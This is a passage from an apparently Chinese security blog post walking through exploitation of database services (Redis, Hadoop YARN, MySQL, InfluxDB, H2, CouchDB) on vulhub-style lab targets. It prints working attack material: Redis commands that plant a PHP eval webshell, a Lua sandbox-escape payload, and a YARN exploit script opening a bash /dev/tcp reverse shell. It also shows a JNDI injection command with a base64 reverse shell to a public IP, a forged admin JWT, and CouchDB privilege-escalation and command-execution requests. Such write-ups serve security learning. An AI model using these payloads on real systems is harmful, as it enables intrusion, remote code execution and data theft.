API，支持嵌入式和服务器模式，提供强加密。</td><td>CVE-2021-23463</td></tr><tr><td>6</td><td>CouchDB</td><td>使用JSON文档的NoSQL文档数据库，支持HTTP API和JavaScript的MapReduce查询。</td><td>5984</td><td>支持ACID属性，多版本并发控制，复制提高可扩展性和容错能力。</td><td>CVE-2017-12636, CVE-2018-8007</td></tr><tr><td>7</td><td>ElasticSearch</td><td>基于Lucene库的搜索引擎，提供分布式、多租户能力的全文搜索引擎。</td><td>9200 &#x2F; 9300</td><td>简单的REST APIs，分布式特性，速度快，可扩展。</td><td>CVE-2021-22145, CVE-2018-17246</td></tr><tr><td>8</td><td>Oracle</td><td>由Oracle公司生产的多模型数据库管理系统。</td><td>1521</td><td>强大的数据完整性、复杂事务、强安全特性和广泛的数据分析功能。</td><td>CVE-2021-35587, CVE-2019-2729</td></tr><tr><td>9</td><td>SQL Server</td><td>微软开发的关系数据库管理系统。</td><td>1433</td><td>支持广泛的事务处理、商业智能和分析应用。</td><td>CVE-2021-1636, CVE-2017-8517</td></tr><tr><td>10</td><td>PostgreSQL</td><td>开源关系数据库，以可靠性、功能强大和性能著称。</td><td>5432</td><td>支持高级SQL标准、JSON、XML，有强大的社区支持。</td><td>CVE-2022-1552, CVE-2019-10208、CVE-2019-10164</td></tr><tr><td>11</td><td>MongoDB</td><td>跨平台的文档导向数据库，使用类JSON的文档，可选模式。</td><td>27017</td><td>支持临时查询、索引和实时聚合。</td><td>CVE-2023-20052, CVE-2021-20329</td></tr></tbody></table><p>具体来说，可以通过报错、端口探测等方式首先确定数据库类型，之后再针对性分析</p><h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><p>REmote DIctionary Server（Redis）是一个由 Salvatore Sanfilippo写的key-value存储系统。<br>Redis是—个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于內存亦可持久化的日志型、Key-Value数据库，并提供多种语言的APl。它通常被称为数据结构服务器，因为值（value）可以是字符串（String），哈希（Map），列表（List），集合（sets）和有序集合（sorted sets）等类型。从2010年3月15日起，Redis的开发工作由 Mware主持。从2013年5月开始，Redis的开发由 Pivotal赞助。目前最新稳定版本为4.0.8<br>Redis是一个开源的高性能键值数据库。最热门的NoSq数据库之一，也被人们称为数据结构服务器。<br>最大的特点就是 ：快</p><ol><li>以内存作为数据存储介质，读写数据的效率极高。</li><li>储存在 Redis中的数据是持久化的，断电或重启，数据也不会丢失</li><li>存储分为内存存储、磁盘存储和log文件。</li><li>可以从磁盘重新将数据加载到內存中，也可以通过配置文件对其进行配置，因此，redis才能实现持久化</li><li>支持主从模式，可以配置集群，更利于支撑大型的项目。<br>Redis默认端口：6379 sentinel.conf配置器端口为26379</li></ol><h3 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h3><p>Redis安装后，如果绑定在 0.0.0.0:6379，并且没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证或使用弱口令的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的authotrized_keys文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。<br>常用命令：<br>1.查看信息：info<br>2.删除所有数据库內容：flushable<br>3.刷新数据库：flush<br>4.看所有键：KEYS*，使用 select nun可以查看键值数据。<br>5.设置变量：set test“who am i<br>6.config set dir dirpath设置路径等配置7.config get dir&#x2F;filename获取路径及数据配置信息<br>8.save保存<br>9.get变量，查看变量名称</p><p>Redis写入webshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/    //切换目录到网站的根目录</span><br><span class="line"><span class="built_in">set</span> x <span class="string">&quot;\n\n\n&lt;?php phpinfo();?&gt;\n\n\n&quot;</span>    //写入恶意代码phpinfo()</span><br><span class="line"><span class="built_in">set</span> xx <span class="string">&quot;\n\n\n&lt;?php @eval(<span class="variable">$_POST</span>[&#x27;1&#x27;]);?&gt;\n\n\n&quot;</span>         //写入一句话木马</span><br><span class="line">config <span class="built_in">set</span> dbfilename a001.php      //磁盘中生成木马文件a001.php</span><br><span class="line">save        //进行保存</span><br></pre></td></tr></table></figure><h3 id="未授权访问-CVE-2022-0543"><a href="#未授权访问-CVE-2022-0543" class="headerlink" title="未授权访问-CVE-2022-0543"></a>未授权访问-CVE-2022-0543</h3><p>Redis 存在代码注入漏洞，Redis 支持使用 Lua 脚本来执行复杂的操作。Lua 脚本在 Redis 中运行在一个被称为“沙箱”的环境中，该环境应限制脚本只能执行安全的操作，阻止访问外部系统资源，如文件系统或系统函数。然而，由于 Debian 和 Ubuntu 的打包错误，Lua 沙箱中错误地包含了 package 对象。<br>2.2 &lt;&#x3D; redis &lt; 5.0.13、2.2 &lt;&#x3D; redis &lt; 6.0.15、2.2 &lt;&#x3D; redis &lt; 6.2.5，首先需要能够成功登陆redis，之后使用下面的payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span> <span class="string">&#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;whoami&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27;</span> 0</span><br></pre></td></tr></table></figure><p>payload的whoami为可以执行的任意系统命令位置，可以换成id或者pwd等等<br>漏洞原理：<br>因为Debian以及Ubuntu发行版的源在打包Redis时，不慎在Lua沙箱中遗留了一个对象package<br>攻击者可通过package中的loadlib函数来加载动态链接库&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;liblua5.1.so.0中的函数luaopen_io，在Lua中执行这个导出函数，即可获得io库，再使用其执行命令。<br>POC解析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;);    // 通过loadlib函数加载动态连接库中的luaopen_io函数，并赋给io_l</span><br><span class="line">local io = io_l();    // 执行io_l()，获取io库</span><br><span class="line">local f = io.popen(&quot;whoami&quot;, &quot;r&quot;);     // 通过io库中的popen来执行命令，并把执行结果返回赋给f</span><br><span class="line">local res = f:read(&quot;*a&quot;);    // 读取f中命令执行的结果内容</span><br><span class="line">f:close();    // 关闭f</span><br><span class="line">return res    // 将读取的结果内容返回</span><br></pre></td></tr></table></figure><h2 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h2><p>Hadoop是一个由Apache基金会开发的分布式系统基础架构，主要解决海量数据的存储和分析计算问题。Hadoop的主要用于：</p><ul><li>分布式存储：通过Hadoop分布式文件系统（HDFS），Hadoop能够存储海量数据，提供高吞吐量的数据访问。</li><li>分布式计算：利用MapReduce编程模型，Hadoop能够处理大量数据集，执行并行计算任务，提高数据处理效率。</li><li>数据挖掘和分析：Hadoop支持复杂的数据分析和数据挖掘任务，帮助用户从大规模数据集中提取有价值的信息。<br>Hadoop YARN的ResourceManager是集群资源分配和调度的关键，若出现未授权访问漏洞，可能使未认证用户访问或操纵资源，引发数据泄露、资源滥用或服务中断。此类安全问题需及时修复，以保护集群安全。<br>该漏洞涉及版本：hadoop 3.3.0以下,访问&#x2F;cluster&#x2F;apps页面：（该页面存在说明存在未授权访问漏洞）<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">使用以下官方exp反弹shell</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">target = <span class="string">&#x27;http://127.0.0.1:8088/&#x27;</span></span><br><span class="line">lhost = <span class="string">&#x27;192.168.0.1&#x27;</span> <span class="comment"># put your local host ip here, and listen at port 9999</span></span><br><span class="line"></span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps/new-application&#x27;</span></span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[<span class="string">&#x27;application-id&#x27;</span>]</span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;application-id&#x27;</span>: app_id,</span><br><span class="line">    <span class="string">&#x27;application-name&#x27;</span>: <span class="string">&#x27;get-shell&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;am-container-spec&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;commands&#x27;</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;command&#x27;</span>: <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#x27;</span> % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;application-type&#x27;</span>: <span class="string">&#x27;YARN&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure>这段 Python 脚本是一个针对 Hadoop YARN (Yet Another Resource Negotiator) 的漏洞利用（exploit）示例，用于反弹 Shell 到指定的监听器。这个脚本的原理是通过未经授权的 API 访问向 YARN 提交一个恶意应用，然后利用 YARN 的应用管理机制来执行任意命令。</li></ul><ol><li><strong>设置目标和监听主机</strong>：<ul><li><code>target</code> 设置为 YARN ResourceManager 的 Web 接口。</li><li><code>lhost</code> 设置为攻击者的监听 IP 地址，用于接收反弹的 Shell。</li></ul></li><li><strong>请求新应用 ID</strong>：<ul><li>脚本首先向 YARN 的 <code>ws/v1/cluster/apps/new-application</code> 发送 POST 请求，这个 API 调用用于获取一个新的应用程序 ID。</li><li>响应中包含 <code>application-id</code>，这是后续提交应用时必须使用的。</li></ul></li><li><strong>构造恶意应用数据</strong>：<ul><li>接下来，脚本构建一个包含恶意命令的 JSON 数据体。</li><li><code>application-id</code> 是从前一步获取的 ID。</li><li><code>application-name</code> 可以是任意名称，在这里设置为 ‘get-shell’。</li><li><code>am-container-spec</code> 是 YARN 中管理应用生命周期的组件，其中 <code>commands</code> 字段用于定义应用启动时执行的命令。这里的命令是一个典型的反弹 Shell 命令 <code>/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1</code>，这条命令尝试创建一个到攻击者 <code>lhost</code> 上 9999 端口的反向 TCP 连接。</li><li><code>application-type</code> 设置为 ‘YARN’，这指定了应用程序类型。</li></ul></li><li><strong>提交恶意应用并触发执行</strong>：<ul><li>最后，脚本将包含恶意数据的 JSON 发送到 <code>ws/v1/cluster/apps</code>，通过 POST 请求实际提交并尝试启动这个应用。</li><li>如果 YARN 未正确配置安全控制，这个请求将成功，YARN 将按照提供的恶意命令执行，导致在指定的 IP 和端口上打开一个反向 Shell。</li></ul></li></ol><h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><h3 id="CVE-2012-2122-未授权远程访问"><a href="#CVE-2012-2122-未授权远程访问" class="headerlink" title="CVE-2012-2122 未授权远程访问"></a>CVE-2012-2122 未授权远程访问</h3><p>CVE-2012-2122 影响的是 MySQL 5.1.x 版本到 5.1.61，MySQL 5.5.x 版本到 5.5.24，以及某些 5.0 版本。这个漏洞主要影响运行在 Linux、OS X、Solaris 平台的 MySQL 版本，Windows 版本由于认证实现的差异通常不受影响。<br>漏洞的利用相对简单，攻击者可以通过重复尝试使用错误的密码登录，直到由于内存比较的错误导致成功登录。在某些情况下，攻击者可能只需要尝试约 256 次即可成功绕过认证。这种利用方式不需要特别复杂的技术，普通的脚本工具就能完成。</p><p>该漏洞源于 MySQL 服务端在验证用户密码时的一个逻辑错误。在 MySQL 中，客户端发送的密码是一个散列值，服务端会将这个散列与期望的散列值进行比较。问题出在比较这两个散列值的函数上（<code>memcmp()</code>），这个函数在某些情况下会由于 CPU 架构的问题错误地返回 0（即认为两个散列值相等），尤其是在 x86 架构的处理器上。<br>POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in `seq 1 1000`; do mysql -uroot -pwrong -h your-ip -P3306 ; done</span><br></pre></td></tr></table></figure><p>在 MySQL 源代码中，漏洞相关的部分主要是 <code>sql/password.c</code> 中的 <code>check_scramble()</code> 函数。问题代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">my_bool <span class="title function_">check_scramble</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *scramble_arg, <span class="type">const</span> <span class="type">char</span> *message, <span class="type">const</span> ulong *hash_stage2)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcmp</span>(hash_stage2, hash_stage2_reassured, SHA1_HASH_SIZE * <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数在比较两个散列值时可能会因为处理器的优化方式和内存对齐问题导致预期外的结果。</p><h2 id="InfluxDB"><a href="#InfluxDB" class="headerlink" title="InfluxDB"></a>InfluxDB</h2><p>InfluxDB是一款时序数据库，其使用JWT作为鉴权方式。在其1.7.6版本以前，默认设置JWT的认证密钥shared-secret为空字符串，导致攻击者可以伪造任意用户身份在InfluxDB中执行SQL语句。漏洞原理是1.7.6之前的InfluxDB在services&#x2F;httpd&#x2F;handler.go中的身份验证函数中存在身份验证绕过漏洞，因为JWT令牌可能具有空的共享密钥（也被称为共享密钥）。</p><p>第一步：访问 <a href="http://ip地址:8086/debug/vars">http://IP地址:8086/debug/vars</a> 查看能不能访问到系统的服务信息，如果能 则可能存在漏洞.（8086 是默认端口.）<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image.png"><br>第二步：访问 <a href="http://ip地址:8086/query">http://IP地址:8086/query</a> 查看查询功能是否会有提示需要登录。<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-1.png"><br>第三步：添加 POST 请求值.<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-2.png"><br>第四步：访问 URL ，然后用 Burp 进行抓包，再发给 Repeater（重发器）<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-3.png"><br>第五步：通过 JSON Web Tokens - jwt.io 生成所需要的 Token：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"> </span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">3751718877</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>username需要已存在的用户才行，所以使用 admin 用户就好.exp是时间戳 ，这个时间戳一定要是未来的时间才行，这里生成了一个 2088 年的时间戳（所以我下面的Encoded值可以直接用）：3751718877： <a href="https://www.beijing-time.org/shijianchuo">https://www.beijing-time.org/shijianchuo</a><br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-4.png"><br>第六步：在 Burp 抓包的数据包中添加 Authorization: Bearer (后面就是 Encoded 生成的值)【这个可以直接用，因为时间戳的结束是2088年】<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-5.png"><br>第七步：如果要进行其他操作则修改 q&#x3D; 你想要查看的信息就行。<br>show users# 显示用户<br>show databases# 显示数据库<br>create database xxx# 创建xxx数据库<br>drop database xxx# 删除xxx数据库<br>create user influx with password ‘***’ with all privileges;# 创建用户<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-6.png"></p><h2 id="H2database-未授权访问"><a href="#H2database-未授权访问" class="headerlink" title="H2database 未授权访问"></a>H2database 未授权访问</h2><p>H2数据库是一个纯Java开发的关系型数据库管理系统（RDBMS），它支持SQL和JDBC标准，具有高性能、小巧、易于使用和部署等特点。同时，它还支持嵌入式、内存和分布式模式，可以满足不同场景的需求。</p><p>H2数据库的特点：<br>1.高性能：H2使用纯Java开发，在性能上比其他Java数据库更有优势，同时支持多种存储引擎，如内存、磁盘等。<br>2.小巧：H2的安装包非常小，可以轻松部署，也不需要安装复杂的数据库服务，只要安装JRE即可。<br>3.易于使用：H2具有简单易用的图形界面，支持丰富的标准SQL和JDBC接口，并提供详细的文档和示例，可以快速上手。<br>4.部署灵活：H2支持嵌入式、内存和分布式模式，可满足不同应用场景的需求，例如Web应用、桌面应用等。<br>H2数据库是一款小巧、高性能、易于使用和部署的Java数据库，非常适合中小型应用的开发和部署。</p><p>H2 数据库控制台中的另一个未经身份验证的 RCE 漏洞，在v2.1.210+中修复。2.1.210 之前的H2控制台允许远程攻击者通过包含子字符串的jdbc:h2:mem JDBC URL执行任意代码。</p><p>漏洞复现：<br>访问http:&#x2F;&#x2F;虚拟机ip:8080&#x2F;h2-console&#x2F;<br>打开之后是一个访问的页面，我们需要用java语言驱动让这个网站主动访问其他主机并且执行命令，需要用到一开始写在最前面的工具进行生成rmi工具（<a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0%EF%BC%89%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%9A">https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0）基础使用方法：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 命令 -A 攻击者的ip（监听者的ip，填你自己的）</span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4xMDcuMTEvNTU2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 8.130.107.11//学了大佬的反弹shell，但是一zhi失败</span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C touch /tmp/success -A 192.168.43.156//这条成功了</span><br></pre></td></tr></table></figure><p>在驱动选择：javax.naming.InitialContext<br>url选择选择一个rmi填写<br>出现下方红色的字体就成功了，同时你的主机检测到了这个网站的访问<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-7.png"></p><h2 id="CouchDB"><a href="#CouchDB" class="headerlink" title="CouchDB"></a>CouchDB</h2><p>CouchDB是一个完全包含web的数据库。使用JSON文档存储数据。通过HTTP使用web浏览器访问您的文档。使用JavaScript查询、合并和转换文档。CouchDB适用于现代网络和移动应用程序。Apache CouchDB是一个开源的面向文档的NoSQL数据库，用Erlang实现。CouchDB 使用多种格式和协议来存储、传输和处理其数据。它使用JSON来存储数据，使用MapReduce使用JavaScript作为查询语言，使用HTTP作为API。</p><h3 id="Couchdb-垂直权限绕过漏洞（CVE-2017-12635）"><a href="#Couchdb-垂直权限绕过漏洞（CVE-2017-12635）" class="headerlink" title="Couchdb 垂直权限绕过漏洞（CVE-2017-12635）"></a>Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</h3><p><a href="https://blog.csdn.net/qq_45300786/article/details/120287521">https://blog.csdn.net/qq_45300786/article/details/120287521</a><br>端口可能是5984，直接访问端口是couchdb,访问&#x2F;_utils目录，网站title是一个红色沙发，title名是Project Fauxton还可以看到couchdb图标<br><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-8.png"><br>影响版本：小于 1.7.0 以及 小于 2.1.1，发送数据包：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT /_users/org.couchdb.user<span class="punctuation">:</span>vulhub HTTP/<span class="number">1.1</span></span><br><span class="line">Host<span class="punctuation">:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.34</span><span class="punctuation">:</span><span class="number">5984</span></span><br><span class="line">Accept<span class="punctuation">:</span> *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 94</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  &quot;type&quot;: &quot;user&quot;,</span></span><br><span class="line"><span class="comment">  &quot;name&quot;: &quot;vulhub&quot;,</span></span><br><span class="line"><span class="comment">  &quot;roles&quot;: [&quot;_admin&quot;],</span></span><br><span class="line"><span class="comment">  &quot;password&quot;: &quot;vulhub&quot;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p>返回403错误：{“error”:”forbidden”,”reason”:”Only _admin may set roles”}，只有管理员才能设置Role角色：发送一次包含两个roles字段的数据包，即可绕过限制：<br>注意：1、roles字段必须为空，3、已创建的用户，你改密码的话，是不行的。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PUT /_users/org.couchdb.user<span class="punctuation">:</span>vulhub HTTP/<span class="number">1.1</span></span><br><span class="line">Host<span class="punctuation">:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.34</span><span class="punctuation">:</span><span class="number">5984</span></span><br><span class="line">Accept<span class="punctuation">:</span> *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 94</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  &quot;type&quot;: &quot;user&quot;,</span></span><br><span class="line"><span class="comment">  &quot;name&quot;: &quot;vulhub&quot;,</span></span><br><span class="line"><span class="comment">  &quot;roles&quot;: [&quot;_admin&quot;],</span></span><br><span class="line"><span class="comment">  &quot;roles&quot;: [],</span></span><br><span class="line"><span class="comment">  &quot;password&quot;: &quot;vulhub&quot;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p>输入我们之前创建的账号密码：vulhub:vulhub <a href="http://xxxx:5984/_utils">http://xxxx:5984/_utils</a> 登录成功！ 同时即可看到user的数量多了1个</p><h3 id="Couchdb-任意命令执行-CVE-2017-12636"><a href="#Couchdb-任意命令执行-CVE-2017-12636" class="headerlink" title="Couchdb 任意命令执行 CVE-2017-12636"></a>Couchdb 任意命令执行 CVE-2017-12636</h3><p>影响版本：小于 1.7.0 以及 小于 2.1.1<br>该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用<a href="https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635">CVE-2017-12635</a>先增加一个管理员用户。<br>它允许已认证的用户在 CouchDB 服务器上执行任意命令。这个漏洞主要利用了 CouchDB 中的 <code>query_servers</code> 配置错误，这是 CouchDB 用于指定如何处理不同编程语言查询的设置。</p><p>1.6.0 下的说明<br>依次执行如下请求即可触发任意命令执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT &#x27;http://vulhub:vulhub@your-ip:5984/_config/query_servers/cmd&#x27; -d &#x27;&quot;id &gt;/tmp/success&quot;&#x27;</span><br><span class="line">curl -X PUT &#x27;http://vulhub:vulhub@your-ip:5984/vultest&#x27;</span><br><span class="line">curl -X PUT &#x27;http://vulhub:vulhub@your-ip:5984/vultest/vul&#x27; -d &#x27;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#x27;</span><br><span class="line">curl -X POST &#x27;http://vulhub:vulhub@your-ip:5984/vultest/_temp_view?limit=10&#x27; -d &#x27;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#x27; -H &#x27;Content-Type:application/json&#x27;</span><br></pre></td></tr></table></figure><p>其中,<code>vulhub:vulhub</code>为管理员账号密码。<br>第一个请求是添加一个名字为<code>cmd</code>的<code>query_servers</code>，其值为<code>&quot;id &gt;/tmp/success&quot;</code>，这就是我们后面待执行的命令。<br>第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。<br>第四个请求就是在这个Database里进行查询，因为我将language设置为<code>cmd</code>，这里就会用到我第一步里添加的名为<code>cmd</code>的<code>query_servers</code>，最后触发命令执行。</p><p>2.1.0 下的说明，2.1.0中修改了上面用到的两个API，这里需要详细说明一下。<br>Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。这个其实也简单，我们带上账号密码访问<code>/_membership</code>即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://vulhub:vulhub@your-ip:5984/_membership</span><br></pre></td></tr></table></figure><p><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-9.png"><br>可见，我们这里只有一个node，名字是<code>nonode@nohost</code>。<br>然后，我们修改<code>nonode@nohost</code>的配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d &#x27;&quot;id &gt;/tmp/success&quot;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2024/09/30/WebSecurity/owasptop/database-security/image-10.png"><br>然后，与1.6.0的利用方式相同，我们先增加一个Database和一个Document：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT &#x27;http://vulhub:vulhub@your-ip:5984/vultest&#x27;</span><br><span class="line">curl -X PUT &#x27;http://vulhub:vulhub@your-ip:5984/vultest/vul&#x27; -d &#x27;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure><p>Couchdb 2.x删除了<code>_temp_view</code>，所以我们为了触发<code>query_servers</code>中定义的命令，需要添加一个<code>_view</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d &#x27;&#123;&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&#x27; -H &quot;Content-Type: application/json&quot;</span><br></pre></td></tr></table></figure><p>增加<code>_view</code>的同时即触发了<code>query_servers</code>中的命令。</p><p>利用exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 